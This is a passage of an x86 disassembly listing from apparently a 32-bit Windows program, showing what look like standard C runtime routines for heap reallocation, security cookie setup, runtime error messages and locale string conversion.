  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
